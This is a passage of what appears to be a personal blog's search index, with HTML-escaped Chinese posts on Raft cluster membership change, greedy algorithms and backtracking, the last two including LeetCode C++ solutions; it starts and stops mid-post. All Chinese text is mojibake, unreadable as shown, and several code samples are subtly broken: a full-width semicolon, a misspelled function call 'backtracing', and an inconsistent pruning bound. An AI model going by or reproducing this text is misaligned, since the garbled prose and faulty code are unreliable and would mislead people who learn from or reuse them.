&lt;li&gt;å¦‚æœå¤šæ•°Followerç¡®è®¤äº†Cold U Cnewè¿™æ¡æ—¥å¿—çš„æ—¶å€™ï¼ŒLeaderå°±Commitè¿™æ¡log entryï¼›&lt;/li&gt;
&lt;li&gt;æ¥ä¸‹æ¥Leaderç”Ÿæˆä¸€æ¡æ–°çš„log entryï¼Œå…¶å†…å®¹æ˜¯å…¨æ–°çš„é…ç½®Cnewï¼ŒåŒæ ·å°†è¯¥log entryå†™å…¥æœ¬åœ°æ—¥å¿—ï¼ŒåŒæ—¶æ¨é€åˆ°Followerä¸Šï¼›&lt;/li&gt;
&lt;li&gt;Followeræ”¶åˆ°æ–°çš„é…ç½®æ—¥å¿—Cnewåï¼Œå°†å…¶å†™å…¥æ—¥å¿—ï¼Œå¹¶ä¸”ä»æ­¤åˆ»èµ·ï¼Œå°±ä»¥è¯¥æ–°çš„é…ç½®ä½œä¸ºç³»ç»Ÿæ‹“æ‰‘ï¼Œå¹¶ä¸”å¦‚æœå‘ç°è‡ªå·±ä¸åœ¨Cnewè¿™ä¸ªé…ç½®ä¸­ä¼šè‡ªåŠ¨é€€å‡º&lt;/li&gt;
&lt;li&gt;Leaderæ”¶åˆ°å¤šæ•°Followerçš„ç¡®è®¤æ¶ˆæ¯ä»¥åï¼Œç»™å®¢æˆ·ç«¯å‘èµ·å‘½ä»¤æ‰§è¡ŒæˆåŠŸçš„æ¶ˆæ¯&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;å¼‚å¸¸åˆ†æ&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;å¦‚æœLeaderçš„Cold U Cnewå°šæœªæ¨é€åˆ°Followerï¼ŒLeaderå°±æŒ‚äº†ï¼Œæ­¤æ—¶é€‰å‡ºçš„æ–°çš„Leaderå¹¶ä¸åŒ…å«è¿™æ¡æ—¥å¿—ï¼Œæ­¤æ—¶æ–°çš„Leaderä¾ç„¶ä½¿ç”¨Coldä½œä¸ºå…¨å±€æ‹“æ‰‘é…ç½®&lt;/li&gt;
&lt;li&gt;å¦‚æœLeaderçš„Cold U Cnewæ¨é€åˆ°å¤§éƒ¨åˆ†çš„Followeråå°±æŒ‚äº†ï¼Œæ­¤æ—¶é€‰å‡ºçš„æ–°çš„Leaderå¯èƒ½æ˜¯Coldä¹Ÿå¯èƒ½æ˜¯Cnewä¸­çš„æŸä¸ªFollowerï¼›&lt;/li&gt;
&lt;li&gt;å¦‚æœLeaderåœ¨æ¨é€Cnewé…ç½®çš„è¿‡ç¨‹ä¸­æŒ‚äº†ï¼Œé‚£ä¹ˆå’Œ2ä¸€æ ·ï¼Œæ–°é€‰å‡ºæ¥çš„Leaderå¯èƒ½æ˜¯Coldä¹Ÿå¯èƒ½æ˜¯Cnewä¸­çš„æŸä¸€ä¸ªï¼Œé‚£ä¹ˆæ­¤æ—¶å®¢æˆ·ç«¯ç»§ç»­æ‰§è¡Œä¸€æ¬¡æ”¹å˜é…ç½®çš„å‘½ä»¤å³å¯&lt;/li&gt;
&lt;li&gt;å¦‚æœå¤§å¤šæ•°çš„Followerç¡®è®¤äº†Cnewè¿™ä¸ªæ¶ˆæ¯åï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥å³ä½¿LeaderæŒ‚äº†ï¼Œæ–°é€‰å‡ºæ¥çš„Leaderä¹Ÿè‚¯å®šæ˜¯ä½äºCnewè¿™ä¸ªé…ç½®ä¸­çš„ï¼Œå› ä¸ºæœ‰Raftçš„åè®®ä¿è¯ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;ä¸ºä»€ä¹ˆéœ€è¦å¼„è¿™æ ·ä¸€ä¸ªä¸¤é˜¶æ®µåè®®ï¼Œè€Œä¸èƒ½ç›´æ¥ä»Coldåˆ‡æ¢è‡³Cnewï¼Ÿ&lt;/p&gt;
&lt;p&gt;è¿™æ˜¯å› ä¸ºï¼Œå¦‚æœç›´æ¥è¿™ä¹ˆç®€å•ç²—æš´çš„æ¥åšçš„è¯ï¼Œå¯èƒ½ä¼šäº§ç”Ÿå¤šä¸»ã€‚ç®€å•è¯´æ˜ä¸‹ï¼š&lt;/p&gt;
&lt;p&gt;å‡è®¾Coldä¸ºæ‹“æ‰‘ä¸º(S1, S2, S3)ï¼Œä¸”S1ä¸ºå½“å‰çš„Leaderï¼Œå¦‚ä¸‹å›¾ï¼š&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;4&#34;&gt;&lt;img src=&#34;https://pic4.zhimg.com/v2-dc605b595be1836ef034864244c36f37_b.jpg&#34; alt=&#34;img&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;å‡å¦‚æ­¤æ—¶å˜æ›´äº†ç³»ç»Ÿé…ç½®ï¼Œå°†é›†ç¾¤èŒƒå›´æ‰©å¤§ä¸º5ä¸ªï¼Œæ–°å¢äº†S4å’ŒS5ä¸¤ä¸ªæœåŠ¡èŠ‚ç‚¹ï¼Œè¿™ä¸ªæ¶ˆæ¯è¢«åˆ†åˆ«æ¨é€è‡³S2å’ŒS3ï¼Œä½†æ˜¯å‡å¦‚åªæœ‰S3æ”¶åˆ°äº†æ¶ˆæ¯å¹¶å¤„ç†ï¼ŒS2å°šæœªå¾—åˆ°è¯¥æ¶ˆæ¯&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;5&#34;&gt;&lt;img src=&#34;https://pic4.zhimg.com/v2-9e275b79809c0793b3a74a6836222e9b_b.jpg&#34; alt=&#34;img&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;è¿™æ—¶åœ¨S2çš„çœ¼é‡Œï¼Œæ‹“æ‰‘ä¾ç„¶æ˜¯&amp;lt;S1, S2, S3&amp;gt;ï¼Œè€Œåœ¨S3çš„çœ¼é‡Œæ‹“æ‰‘åˆ™å˜æˆäº†&amp;lt;S1, S2, S3, S4, S5&amp;gt;ã€‚å‡å¦‚æ­¤æ—¶ç”±äºæŸç§åŸå› è§¦å‘äº†ä¸€æ¬¡æ–°çš„é€‰ä¸»ï¼ŒS2å’ŒS3åˆ†åˆ«å‘èµ·é€‰ä¸»çš„è¯·æ±‚ï¼š&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;6&#34;&gt;&lt;img src=&#34;https://pic3.zhimg.com/v2-63fee36e8721b0ace81ca47aa3f90a7a_b.jpg&#34; alt=&#34;img&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;æœ€ç»ˆï¼Œå€™é€‰è€…S2è·å¾—äº†S1å’ŒS2è‡ªå·±çš„&lt;a href=&#34;https://www.zhihu.com/search?q=%E8%B5%9E%E6%88%90%E7%A5%A8&amp;amp;search_source=Entity&amp;amp;hybrid_search_source=Entity&amp;amp;hybrid_search_extra=%7B%22sourceType%22%3A%22article%22%2C%22sourceId%22%3A%2227207160%22%7D&#34;&gt;èµæˆç¥¨&lt;/a&gt;ï¼Œé‚£ä¹ˆåœ¨å®ƒçœ¼é‡Œï¼Œå®ƒå°±å˜æˆäº†Leaderï¼Œè€ŒS3è·å¾—äº†S4ã€S5å’ŒS3è‡ªå·±çš„èµæˆç¥¨ï¼Œåœ¨å®ƒçœ¼é‡ŒS3ä¹Ÿå˜æˆäº†Leaderï¼Œé‚£ä¹ˆå¤šLeaderçš„é—®é¢˜å°±äº§ç”Ÿäº†ã€‚è€Œäº§ç”Ÿè¯¥é—®é¢˜çš„æœ€æ ¹æœ¬åŸå› æ˜¯S2å’ŒS3çš„ç³»ç»Ÿè§†å›¾ä¸ä¸€è‡´ã€‚&lt;/p&gt;
&lt;h2 id=&#34;re&#34;&gt;RE&lt;/h2&gt;
&lt;p&gt;https://zhuanlan.zhihu.com/p/27207160&lt;br&gt;
https://raft.github.io/raft.pdf&lt;/p&gt;
">ã€åˆ†å¸ƒå¼ã€‘Raft ä¸€è‡´æ€§å…±è¯†ç®—æ³•</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/suan-fa-tan-xin/"" data-c="
          &lt;p&gt;è´ªå¿ƒç®—æ³•æ²¡æœ‰å›ºå®šçš„å¥—è·¯ï¼Œéš¾ç‚¹å°±æ˜¯å›¾å’Œé€šè¿‡å±€éƒ¨æœ€ä¼˜ï¼Œæ¨å‡ºæ•´ä½“æœ€ä¼˜ã€‚&lt;/p&gt;
&lt;p&gt;æœ€å¥½çš„ç­–ç•¥å°±æ˜¯ä¸¾åä¾‹ï¼Œæƒ³ä¸åˆ°èŒƒä¾‹ï¼Œé‚£å°±å¯ä»¥è¯•ä¸€è¯•è´ªå¿ƒã€‚&lt;/p&gt;
&lt;p&gt;æƒ³æ¸…æ¥šå±€éƒ¨æœ€ä¼˜å’Œå…¨å±€æœ€ä¼˜ï¼Œæ„Ÿè§‰å±€éƒ¨æœ€ä¼˜å¯ä»¥æ¨å‡ºå…¨å±€æœ€ä¼˜ï¼Œå¹¶æƒ³ä¸å‡ºè¿”ä¾‹ï¼Œå°±å¯ä»¥è¯•è¯•è´ªå¿ƒã€‚&lt;/p&gt;
&lt;h4 id=&#34;åˆ†å‘é¥¼å¹²&#34;&gt;åˆ†å‘é¥¼å¹²&lt;/h4&gt;
&lt;p&gt;https://leetcode-cn.com/problems/assign-cookies/submissions/&lt;/p&gt;
&lt;p&gt;è¿™é‡Œçš„å±€éƒ¨æœ€ä¼˜è§£å°±æ˜¯å¤§é¥¼å¹²å–‚ç»™èƒƒå£å¤§çš„ï¼Œå……åˆ†åˆ©ç”¨é¥¼å¹²å°ºå¯¸ï¼Œå…¨å±€æœ€ä¼˜å°±æ˜¯å–‚é¥±å°½å¯èƒ½å¤šçš„å°å­©ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;class Solution {
public:
    int findContentChildren(vector&amp;lt;int&amp;gt;&amp;amp; g, vector&amp;lt;int&amp;gt;&amp;amp; s) {
        sort(g.begin(), g.end());
        sort(s.begin(), s.end());
        int res = 0;
        for (int i = 0; i &amp;lt; s.size(); i ++) {
            if (res &amp;lt; g.size() &amp;amp;&amp;amp; g[res] &amp;lt;= s[i])
                res ++ ;
        }
        return res;
    }
};
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;æ‘†åŠ¨åºåˆ—&#34;&gt;æ‘†åŠ¨åºåˆ—&lt;/h4&gt;
&lt;p&gt;https://leetcode-cn.com/problems/wiggle-subsequence/&lt;/p&gt;
&lt;p&gt;å±€éƒ¨æœ€ä¼˜ï¼šå°†ä¸€ä¸ªå•è°ƒåºåˆ—ä¸­é™¤äº†ä¸¤ä¸ªå³°å€¼çš„å…¶å®ƒå…ƒç´ åˆ é™¤æ‰&lt;/p&gt;
&lt;p&gt;å…¨å±€æœ€ä¼˜ï¼šå°†åºåˆ—ä¸­çš„æ‰€æœ‰å•è°ƒéƒ¨åˆ†é™¤äº†å±€éƒ¨å³°å€¼éƒ½åˆ é™¤æ‰&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;class Solution {
public:
    int wiggleMaxLength(vector&amp;lt;int&amp;gt;&amp;amp; nums) {
        if (nums.size() &amp;lt;= 1) return nums.size();
        int curDiff = 0; // å½“å‰ä¸€å¯¹å·®å€¼
        int preDiff = 0; // å‰ä¸€å¯¹å·®å€¼
        int result = 1;  // è®°å½•å³°å€¼ä¸ªæ•°ï¼Œåºåˆ—é»˜è®¤åºåˆ—æœ€å³è¾¹æœ‰ä¸€ä¸ªå³°å€¼
        for (int i = 0; i &amp;lt; nums.size() - 1; i++) {
            curDiff = nums[i + 1] - nums[i];
            // å‡ºç°å³°å€¼
            if ((curDiff &amp;gt; 0 &amp;amp;&amp;amp; preDiff &amp;lt;= 0) || (preDiff &amp;gt;= 0 &amp;amp;&amp;amp; curDiff &amp;lt; 0)) {
                result++;
                preDiff = curDiff;
            }
        }
        return result;
    }
};
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;æœ€å¤§å­åºå’Œ&#34;&gt;æœ€å¤§å­åºå’Œ&lt;/h4&gt;
&lt;p&gt;https://leetcode-cn.com/problems/maximum-subarray/&lt;/p&gt;
&lt;p&gt;å±€éƒ¨æœ€ä¼˜ï¼šå½“å‰è¿ç»­å’Œä¸ºè´Ÿæ•°æ—¶ç«‹åˆ»æ”¾å¼ƒï¼Œä»ä¸‹ä¸€ä¸ªå…ƒç´ é‡æ–°è®¡ç®—è¿ç»­å’Œ&lt;/p&gt;
&lt;p&gt;å…¨å±€æœ€ä¼˜ï¼šé€‰å–æœ€å¤§è¿ç»­å’Œ&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;// è´ªå¿ƒ
class Solution {
public:
    int maxSubArray(vector&amp;lt;int&amp;gt;&amp;amp; nums) {
        int res = -100000ï¼›
        int count = 0;
        for (int i = 0; i &amp;lt; nums.size(); i++) {
            count += nums[i];
            res = max(count, res);
            if (count &amp;lt; 0) count = 0; // å¦‚æœå‰é¢çš„å­åºåˆ—å’Œå°äº0ï¼Œé‚£ä¹ˆå°±ä¸è¦é€‰äº†
        }
        return res;
    }
};

// åŠ¨è§„
class Solution {
public:
    int maxSubArray(vector&amp;lt;int&amp;gt;&amp;amp; nums) {
        int dp[100005];
        dp[0] = nums[0];
        int res = dp[0];
        for (int i = 1; i &amp;lt; nums.size(); i++) {
            dp[i] = max(dp[i - 1] + nums[i], nums[i]); // çŠ¶æ€è½¬ç§»
            res = max(dp[i], res);
        }
        return res;
    }
};
&lt;/code&gt;&lt;/pre&gt;
">ã€ç®—æ³•ã€‘è´ªå¿ƒ</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/suan-fa-hui-su/"" data-c="
          &lt;p&gt;å›æº¯å…¶å®å°±æ˜¯DFSçš„ä¸€ç§ï¼Œé€šå¸¸DFSéœ€è¦æœ‰ä¸€ä¸ªå…¨å±€çš„çºªå½•ï¼Œè®°å½•å“ªäº›èŠ‚ç‚¹è¢«è®¿é—®è¿‡äº†ã€‚&lt;/p&gt;
&lt;p&gt;å›æº¯æ˜¯é€’å½’çš„å‰¯äº§å“ï¼Œåªè¦æœ‰é€’å½’å°±ä¼šåˆå›æº¯ï¼Œå¦å¤–å›æº¯æ³•ä¸æ˜¯ä»€ä¹ˆé«˜æ•ˆçš„ç®—æ³•ï¼Œå› ä¸ºå›æº¯æœ¬è´¨ä¸Šæ˜¯ç©·ä¸¾ï¼Œå¦‚æœæƒ³è¦é«˜æ•ˆä¸€äº›ï¼Œéœ€è¦åŠ ä¸Šå‰ªæã€‚&lt;/p&gt;
&lt;p&gt;å›æº¯ä¸€èˆ¬èƒ½è§£å†³çš„é—®é¢˜ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;ç»„åˆé—®é¢˜ï¼šNä¸ªæ•°ä¸­æŒ‰ä¸€å®šè§„åˆ™æ‰¾å‡ºkä¸ªæ•°çš„é›†åˆï¼›&lt;/li&gt;
&lt;li&gt;åˆ‡å‰²é—®é¢˜ï¼šä¸€ä¸ªå­—ç¬¦ä¸²æŒ‰ä¸€å®šè§„åˆ™æœ‰å‡ ç§åˆ‡å‰²æ–¹å¼ï¼›&lt;/li&gt;
&lt;li&gt;å­é›†é—®é¢˜ï¼šNä¸ªæ•°çš„é›†åˆé‡Œæœ‰å¤šå°‘ç¬¦åˆæ¡ä»¶çš„å­é›†ï¼›&lt;/li&gt;
&lt;li&gt;æ’åˆ—é—®é¢˜ï¼šNä¸ªæ•°æŒ‰ä¸€å®šè§„åˆ™å…¨æ’åˆ—ï¼Œæœ‰å‡ ç§æ’åˆ—æ–¹å¼ï¼›&lt;/li&gt;
&lt;li&gt;æ£‹ç›˜é—®é¢˜ï¼šNçš‡åï¼Œè§£æ•°ç‹¬ç­‰&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;å›æº¯é—®é¢˜éƒ½å¯ä»¥æŠ½è±¡ä¸º&lt;strong&gt;æ ‘å½¢ç»“æ„&lt;/strong&gt;ï¼Œåœ¨é›†åˆä¸­é€’å½’æŸ¥æ‰¾æŸäº›å…ƒç´ ï¼Œé›†åˆçš„å¤§å°å°±æ„æˆäº†æ ‘çš„å®½åº¦ï¼Œé€’å½’çš„æ·±åº¦å°±æ˜¯æ ‘çš„æ·±åº¦ã€‚forå¾ªç¯æ˜¯æ ‘çš„æ¨ªå‘éå†ï¼Œé€’å½’æ˜¯æ ‘çš„æ·±åº¦éå†ã€‚&lt;/p&gt;
&lt;p&gt;æ¨¡æ¿ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;void backtracking(å‚æ•°) {
    if (ç»ˆæ­¢æ¡ä»¶) {
        å­˜æ”¾ç»“æœ;
        return;
    }

    for (é€‰æ‹©ï¼šæœ¬å±‚é›†åˆä¸­å…ƒç´ ï¼ˆæ ‘ä¸­èŠ‚ç‚¹å­©å­çš„æ•°é‡å°±æ˜¯é›†åˆçš„å¤§å°ï¼‰) {
        å¤„ç†èŠ‚ç‚¹;
        backtracking(è·¯å¾„ï¼Œé€‰æ‹©åˆ—è¡¨); // é€’å½’
        å›æº¯ï¼Œæ’¤é”€å¤„ç†ç»“æœ;
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;ç»„åˆ&#34;&gt;ç»„åˆ&lt;/h4&gt;
&lt;p&gt;ç»™å®šä¸¤ä¸ªæ•´æ•° &lt;code&gt;n&lt;/code&gt; å’Œ &lt;code&gt;k&lt;/code&gt;ï¼Œè¿”å›èŒƒå›´ &lt;code&gt;[1, n]&lt;/code&gt; ä¸­æ‰€æœ‰å¯èƒ½çš„ &lt;code&gt;k&lt;/code&gt; ä¸ªæ•°çš„ç»„åˆã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;class Solution {
public:
    vector&amp;lt;vector&amp;lt;int&amp;gt; &amp;gt; res;
    vector&amp;lt;int&amp;gt; tmpres;
    vector&amp;lt;vector&amp;lt;int&amp;gt;&amp;gt; combine(int n, int k) {
        backtracing(1, n, k);
        return res;
    }

    void backtracking(int index, int n, int k) {
        if (tmpres.size() == k) {
            res.push_back(tmpres);
            return ;
        }
        // for (int i = index; i &amp;lt;= n - (k - tmpres.size()) + 1; i ++) { // å‰ªæ
        for (int i = index; i &amp;lt;= n; i ++) {
            tmpres.push_back(i);
            backtracing(i + 1, n, k);
            tmpres.pop_back();
        }
        return ;
    }
};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¿™é‡Œå¯ä»¥åšä¸€ä¸ªå‰ªæä¼˜åŒ–ï¼Œå°±æ˜¯å¦‚æœå‰©ä¸‹çš„å¾…é€‰æ‹©çš„æ•°çš„ä¸ªæ•°å°äºéœ€è¦çš„ä¸ªæ•°çš„è¯ï¼Œé‚£ä¹ˆå°±æ²¡æœ‰å¿…è¦éå†äº†ï¼Œä¾‹å¦‚n=4ï¼Œk=4ï¼Œé‚£ä¹ˆindexä»2å¼€å§‹çš„åé¢çš„æ•°å°±æ²¡å¿…è¦éå†äº†ï¼Œå› ä¸ºè‚¯å®šä¸å¤Ÿå››ä¸ªæ•°äº†ã€‚&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;å·²ç»é€‰æ‹©å…ƒç´ çš„ä¸ªæ•°ï¼š&lt;code&gt;tmpres.size()&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;è¿˜éœ€è¦é€‰æ‹©çš„ä¸ªæ•°ï¼š&lt;code&gt;k - tmpres.size()&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;åœ¨é›†åˆä¸­è‡³å¤šè¦èµ·å§‹çš„ä½ç½®ï¼š&lt;code&gt;n - (k - tmpres.size()) + 1&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;ä¾‹å¦‚ï¼Œn=4ï¼Œ k=3ï¼Œ é‚£ä¹ˆå½“ä¸€ä¸ªå…ƒç´ æ²¡æœ‰é€‰&lt;code&gt;tmpres.size() == 0&lt;/code&gt;æ—¶ï¼Œè‡³å°‘è¦ä»2å¼€å§‹éå†ï¼Œå¦‚æœä»3å¼€å§‹éå†æ˜¾ç„¶åé¢çš„æ•°å­—å°±ä¸å¤Ÿkä¸ªäº†ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;ç»„åˆæ€»å’Œ1&#34;&gt;ç»„åˆæ€»å’Œ1&lt;/h4&gt;
&lt;p&gt;æ‰¾å‡ºæ‰€æœ‰ç›¸åŠ ä¹‹å’Œä¸º n çš„ k ä¸ªæ•°çš„ç»„åˆã€‚ç»„åˆä¸­åªå…è®¸å«æœ‰ 1 - 9 çš„æ­£æ•´æ•°ï¼Œå¹¶ä¸”æ¯ç§ç»„åˆä¸­ä¸å­˜åœ¨é‡å¤çš„æ•°å­—ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;class Solution {
public:
    vector&amp;lt;vector&amp;lt;int&amp;gt; &amp;gt; res;
    vector&amp;lt;int&amp;gt; tmp;
    int visit[10] = {0};
    vector&amp;lt;vector&amp;lt;int&amp;gt;&amp;gt; combinationSum3(int k, int n) {
        backtracking(1, k, n, 0);
        return res;
    }

    void backtracking(int index, int k, int n, int sum) {
        // if(sum &amp;gt; n) return ; // å‰ªæ
        if (tmp.size() == k &amp;amp;&amp;amp; sum == n) {
            res.push_back(tmp);
            return ;
        }
        // for (int i = index; i &amp;lt;= 9 - (k - tmp.size()) + 1; i ++) { // å‰ªæ
        for (int i = index; i &amp;lt;= 9; i ++) {
            if (visit[i] != 1) {
                tmp.push_back(i);
                visit[i] = 1;
                backtracking(i + 1, k, n, sum + i);
                visit[i] = 0;
                tmp.pop_back();
            }
        }
    }
};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å‰ªæå°±æ˜¯å¦‚æœå½“å‰tmpä¸­æ‰€æœ‰æ•°çš„å’Œå·²ç»å¤§äºnäº†ï¼Œé‚£ä¹ˆåé¢çš„éå†ä¹Ÿå°±æ²¡æ„ä¹‰äº†ï¼Œè‚¯å®šæ›´å¤§äº†ï¼Œæ‰€ä»¥&lt;code&gt;if(sum &amp;gt; n) return ;&lt;/code&gt;ï¼Œå¦å¤–å¦‚æœå‰©ä¸‹çš„æ•°çš„ä¸ªæ•°ä¸å¤Ÿäº†ï¼Œæ˜¾ç„¶ä¹Ÿä¸ç”¨ç»§ç»­éå†äº†ï¼Œå³ï¼š&lt;code&gt;i &amp;lt;= 9 - (k - tmp.size() + 1)&lt;/code&gt;ã€‚&lt;/p&gt;
&lt;h4 id=&#34;ç”µè¯å·ç çš„å­—æ¯ç»„åˆ&#34;&gt;ç”µè¯å·ç çš„å­—æ¯ç»„åˆ&lt;/h4&gt;
&lt;p&gt;https://leetcode-cn.com/problems/letter-combinations-of-a-phone-number/submissions/&lt;/p&gt;
&lt;p&gt;æ‰‹æœº9å®«æ ¼æŒ‰é”®ï¼Œä¾‹å¦‚è¾“å…¥&amp;quot;23&amp;quot;ï¼Œå¯èƒ½å‡ºç°çš„å­—ç¬¦ç»„åˆä¸º[&amp;quot;ad&amp;quot;, &amp;quot;ae&amp;quot;, &amp;quot;af&amp;quot;, &amp;quot;bd&amp;quot;, &amp;quot;be&amp;quot;, &amp;quot;bf&amp;quot;, &amp;quot;cd&amp;quot;, &amp;quot;ce&amp;quot;, &amp;quot;cf&amp;quot;]ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;class Solution {
public:
    vector&amp;lt;string&amp;gt; res;
    vector&amp;lt;char&amp;gt; tmp;
    string number_str[11] = {&amp;quot;&amp;quot;, &amp;quot;&amp;quot;, &amp;quot;abc&amp;quot;, &amp;quot;def&amp;quot;, &amp;quot;ghi&amp;quot;, &amp;quot;jkl&amp;quot;, &amp;quot;mno&amp;quot;, &amp;quot;pqrs&amp;quot;, &amp;quot;tuv&amp;quot;, &amp;quot;wxyz&amp;quot;};
    vector&amp;lt;string&amp;gt; letterCombinations(string digits) {
        if(digits == &amp;quot;&amp;quot;) return res;
        int k = digits.length();
        backtracking(digits, 0, k);
        return res;
    }

    void backtracking(string digits, int digits_index, int k) {
        if (digits_index == k) {
            string str = &amp;quot;&amp;quot;;
            for (int i = 0; i &amp;lt; k; i ++) {
                str += tmp[i];
            }
            res.push_back(str);
            return ;
        }
        string str = number_str[digits[digits_index] - &#39;0&#39;];
        for (int i = 0; i &amp;lt; str.length(); i ++) {
            tmp.push_back(str[i]);
            backtracking(digits, digits_index + 1, k);
            tmp.pop_back();
        }

        return ;
    }
};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æ€è·¯å¤§æ¦‚å°±æ˜¯æŒ‰ç…§è¾“å…¥çš„æ•°å­—ï¼Œå¯¹äºæ¯ä¸ªæ•°å­—æŒ‘å‡ºä¸€ä¸ªå­—ç¬¦ï¼Œæ ‘çš„æ·±åº¦å°±æ˜¯é”®å…¥çš„æ•°å­—çš„ä¸ªæ•°ï¼Œå®½åº¦å°±æ˜¯æœ€é•¿æ˜¯4ã€‚ç»ˆæ­¢æ¡ä»¶å°±æ˜¯é€‰å–çš„å­—ç¬¦çš„ä¸ªæ•°ç­‰äºé”®å…¥çš„æ•°å­—çš„ä¸ªæ•°æ—¶ã€‚&lt;/p&gt;
&lt;h4 id=&#34;ç»„åˆæ€»å’Œ2&#34;&gt;ç»„åˆæ€»å’Œ2&lt;/h4&gt;
&lt;p&gt;https://leetcode-cn.com/problems/combination-sum/&lt;/p&gt;
&lt;p&gt;ç»™å®šä¸€ä¸ªæ— é‡å¤å…ƒç´ çš„æ­£æ•´æ•°æ•°ç»„ candidates å’Œä¸€ä¸ªæ­£æ•´æ•° target ï¼Œæ‰¾å‡º candidates ä¸­æ‰€æœ‰å¯ä»¥ä½¿æ•°å­—å’Œä¸ºç›®æ ‡æ•° target çš„å”¯ä¸€ç»„åˆï¼Œcandidateä¸­çš„å…ƒç´ å¯ä»¥å¤šæ¬¡ä½¿ç”¨ï¼Œä½†ç»“æœä¸­ä¸èƒ½å­˜åœ¨ç›¸åŒçš„å­é›†ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;class Solution {
public:
    vector&amp;lt;vector&amp;lt;int&amp;gt; &amp;gt;res;
    vector&amp;lt;int&amp;gt; tmp;
    vector&amp;lt;vector&amp;lt;int&amp;gt;&amp;gt; combinationSum(vector&amp;lt;int&amp;gt;&amp;amp; candidates, int target) {
        if(candidates.size() == 0 || target == 0) return res; 
        backtracking(candidates, target, 0, 0);
        return res;
    }

    void backtracking(vector&amp;lt;int&amp;gt;&amp;amp; candidates, int target, int sum, int index) {
        if(sum &amp;gt; target) return ;
        if (sum == target) {
            res.push_back(tmp);
            return ;
        }
        for (int i = index; i &amp;lt; candidates.size(); i ++) {
            tmp.push_back(candidates[i]);
            backtracking(candidates, target, sum + candidates[i], i);
            tmp.pop_back();
        }
    }
};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯index ä¸æ˜¯ä»i+1å¼€å§‹äº†ï¼Œè€Œæ˜¯ä»iå¼€å§‹ï¼Œå› ä¸ºå¯ä»¥æœ‰é‡å¤å…ƒç´ ã€‚&lt;/p&gt;
&lt;h4 id=&#34;ç»„æ•°æ€»å’Œ3&#34;&gt;ç»„æ•°æ€»å’Œ3&lt;/h4&gt;
&lt;p&gt;https://leetcode-cn.com/problems/combination-sum-ii/&lt;/p&gt;
&lt;p&gt;è¿™é“é¢˜åœ¨ä¹‹å‰çš„åŸºç¡€ä¸Šï¼Œcandidateæ•°ç»„ä¸­çš„å…ƒç´ æœ‰é‡å¤çš„äº†ï¼Œä½†æ˜¯æ¯ä¸ªå…ƒç´ åªèƒ½ä½¿ç”¨ä¸€æ¬¡ã€‚&lt;/p&gt;
&lt;p&gt;æœ‰é‡å¤çš„å°±éœ€è¦å»é‡ï¼Œåœ¨æ ‘å½¢ç»“æ„ä¸­é‡å¤åˆ†ä¸ºä¸¤ä¸ªç»´åº¦ï¼Œç¬¬ä¸€ä¸ªç»´åº¦å°±æ˜¯ä¸€ä¸ªæ ‘æä¸Šçš„é‡å¤å…ƒç´ ï¼Œå¦ä¸€ä¸ªç»´åº¦å°±æ˜¯ä»ä¸€å±‚ä¸Šçš„é‡å¤å…ƒç´ ï¼Œè¿™é“é¢˜æ˜¾ç„¶æ˜¯éœ€è¦å»é™¤åŒä¸€å±‚ä¸Šçš„é‡å¤å…ƒç´ ã€‚&lt;/p&gt;
